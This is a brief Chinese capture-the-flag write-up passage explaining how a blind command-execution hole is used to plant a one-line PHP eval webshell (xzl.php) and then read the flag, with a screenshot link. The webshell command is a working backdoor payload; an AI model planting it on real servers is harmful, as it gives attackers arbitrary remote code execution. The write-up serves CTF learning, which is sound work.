这里留个一个无回显的命令执行功能，可以借此拿到权限获取flag的方法很多，下面介绍其中一种

通过写webshell获取flag

执行命令：

```
echo '<?php @eval($_GET["x"]); ?>' > xzl.php
```

然后直接读取flag

![image-20210303163436136](https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210303163436136.png)